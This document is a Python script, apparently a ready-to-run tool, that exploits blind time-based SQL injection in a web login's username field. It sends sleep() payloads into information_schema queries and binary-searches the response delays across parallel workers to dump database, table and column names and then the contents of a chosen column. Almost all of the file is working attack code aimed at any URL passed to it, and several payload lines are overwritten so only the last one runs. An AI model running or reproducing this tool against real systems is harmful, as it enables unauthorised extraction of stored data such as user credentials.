#AUTHOR: jahman 
#EDITED BY grisun0

import requests
requests.packages.urllib3.disable_warnings()
import re, sys, time
import argparse
import concurrent.futures
from concurrent.futures import ProcessPoolExecutor, as_completed

def send_payload(payload, url, s, sql_time):
    payload = f"FUZZ';{payload}#"

    
    post_data = {'username': payload}
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie": ""}
    start_time = time.time()
    res = s.post(url, headers=headers, data=post_data, allow_redirects=False)
    timelaps = time.time() - start_time
    if int(timelaps) == 0:
        return False
    else:
        if int(timelaps) > (sql_time - 1) and res.status_code == 302:
            return True
        else:
            return False

def sqli_dichotomie(payload_brute, offset, url, s, sql_time):
    payload_brute = payload_brute.replace("ZION_OFFSET", str(offset))  
    start = 32
    end = 127
    guess = -1

    while guess != 0:
        guess = int((end - start) / 2)
        payload = f"{payload_brute} between {start} and {start + guess} limit 1 offset 0"
        if send_payload(payload, url, s, sql_time):
            end = start + guess
        else:
            start = start + guess

    payload = f"{payload_brute} like {start} limit 1 offset 0"
    if send_payload(payload, url, s, sql_time):
        return start, offset
    if end == 127:
        return -1, offset
    return end, offset

def sqli_thread(url, db, table, col, sql_time, threads):
    CRACKED = list()
    s = requests.Session()  

    offset = 1
    stop = 1
    while stop != -1:
        CRACKED.extend("\x00" * threads)
        with ProcessPoolExecutor(max_workers=threads) as e:
            
            payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(schema_name), ZION_OFFSET, 1)) FROM information_schema.schemata)"
            
            
            payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(table_name), ZION_OFFSET, 1)) FROM information_schema.TABLES where table_schema like '{db}%')"

            
            payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(column_name), ZION_OFFSET, 1)) from information_schema.columns WHERE table_name = '{table}' AND table_schema like '{db}%')"

            
            payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT({col}), ZION_OFFSET, 1)) from {table})"

            resultat = {e.submit(sqli_dichotomie, payload, inject, url, s, sql_time): inject for inject in range(offset, offset + threads)}

        for future in as_completed(resultat):
            if future.result()[0] == -1:
                stop = -1
            try:
                res_offset = future.result()[1] - 1
                res_char = chr(future.result()[0])
                CRACKED[res_offset] = res_char
                print(''.join(CRACKED), end="\r\n")
            except Exception as exc:
                continue

        offset = offset + threads
    print(f"\nCRACKED= {''.join(CRACKED)}")
    return

def main(args):
    url = args.url
    db = args.db
    table = args.table
    col = args.col
    sql_time = args.sql_time
    threads = args.threads
    sqli_thread(url, db, table, col, sql_time, threads)
    return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Enumeration Tool")
    parser.add_argument("--url", required=True, help="The URL to test")
    parser.add_argument("--db", required=True, help="The name of the database")
    parser.add_argument("--table", required=True, help="The name of the table")
    parser.add_argument("--col", required=True, help="The columns to dump")
    parser.add_argument("--sql_time", type=int, default=1, help="The SQL time delay for injection")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")

    args = parser.parse_args()

    start_time = time.time()
    main(args)
    print("--- %s seconds ---" % (time.time() - start_time))
    print("--- Vive la Commune! ---")
    sys.exit(0)
